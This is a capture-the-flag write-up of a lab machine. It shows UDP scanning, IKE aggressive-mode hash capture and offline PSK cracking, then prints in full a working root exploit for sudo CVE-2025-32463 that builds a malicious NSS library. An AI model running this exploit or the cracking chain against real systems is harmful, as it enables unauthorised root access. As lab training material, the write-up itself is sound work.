
## Enumeration

```sh
mkdir nmap
nmap -sV -sC -oA nmap/expressway 10.10.11.87
```

![](../attachments/Screenshot%202025-11-11%20224439.png)

but I find nothing other than `ssh`. So this was a TCP scan, so I widen my checks to UDP 
```sh
nmap -sU -sV -T4 10.10.11.87
```

![](../attachments/Screenshot%202025-11-11%20230945.png)

and I found some interesting ports like port 69 `TFTP` and port 500 which runs `ISAKMP`. Searching on the Internet about `ISAKMP` I found this:

- Internet Security Association and Key Management Protocol (`ISAKMP`) is a key protocol in the IPSec architecture. So **IPSec** encrypts and authenticates data packets between two devices. While **ISAKMP** defines how to negotiate, establish and manage security associations and key exchange parameters used by **IPSec**.
- Also, **IKE** (Internet Key Exchange) uses the ISAKMP framework to exchange keys.

So seeing the port 500 running, suggests that it might be running an IPSec VPN and searching the Internet i found a webpage about `IKE Cheat Sheet for Penetration Testers`

![](../attachments/Screenshot%202025-11-11%20231042.png)

For enumeration I will the tool `ike-scan`:
```sh
ike-scan -M 10.10.11.87
```

![](../attachments/Pasted%20image%2020251111231704.png)

The IKE Main Mode handshake returned that the peer requires a **PSK** (pre-shared key) and uses **3DES + SHA1**.
Also we got Vendor IDs (XAUTH, Dead Peer Detection) and because of that, we can try an Aggressive Mode to see if the service will leak something:

```sh
ike-scan -M -A 10.10.11.87
```

![](../attachments/Screenshot%202025-11-11%20232156.png)

and we got and identity `ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)` and a hash but we are not seeing it, so we rerun the command and specify to save the hash on file `scan.txt`

```sh
ike-scan -M -A -Pscan.txt 10.10.11.87
```

and so we have the hash on the file `scan.txt`:

![](../attachments/Pasted%20image%2020251111233450.png)

So now we have to crack the hash. The website that I found exactly something like this called Brute-Forcing PSKs (Offline Cracking)

![](../attachments/Pasted%20image%2020251111233600.png)

So all I had to do was 
```sh
psk-crack --d /usr/share/wordlists/rockyou.txt scan.txt
```

![](../attachments/Pasted%20image%2020251111233655.png)

and I was able to crack the PSK (`freakingrockstarontheroad`)

So now all I had to do was SSH with the user `ike` that I found before and the password that I just found. AND I found the user flag!!! 

![](../attachments/Pasted%20image%2020251111233906.png)

## Privilege Escalation

I tried `sudo -l`

![](../attachments/Pasted%20image%2020251111235309.png)

Then because in this machine there was already the `linpeas.sh` program I ran it:

```sh
./linpeas.sh
```

And it found something very notable:

![](../attachments/Pasted%20image%2020251111235416.png)

So searching the Internet about this `woot/etc/group` I found the vulnerability `CVE-2025-32463` 

I found this GitHub repo where it had a Proof Of Concept:

![](../attachments/Pasted%20image%2020251112003558.png)

I created the `exploit.sh`

```sh
#!/bin/bash
# sudo-chwoot.sh
# CVE-2025-32463 – Sudo EoP Exploit PoC by Rich Mirch
#                  @ Stratascale Cyber Research Unit (CRU)
STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)
cd ${STAGE?} || exit 1

cat > woot1337.c<<EOF
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void woot(void) {
  setreuid(0,0);
  setregid(0,0);
  chdir("/");
  execl("/bin/bash", "/bin/bash", NULL);
}
EOF

mkdir -p woot/etc libnss_
echo "passwd: /woot1337" > woot/etc/nsswitch.conf
cp /etc/group woot/etc
gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c

echo "woot!"
sudo -R woot woot
rm -rf ${STAGE?}
```

I opened a Python server on the Kali machine and from the target machine I downloaded the file and then I ran it:

![](../attachments/Pasted%20image%2020251112003754.png)

I became root and I was able to read the root flag!!!

![](../attachments/Pasted%20image%2020251112003815.png)
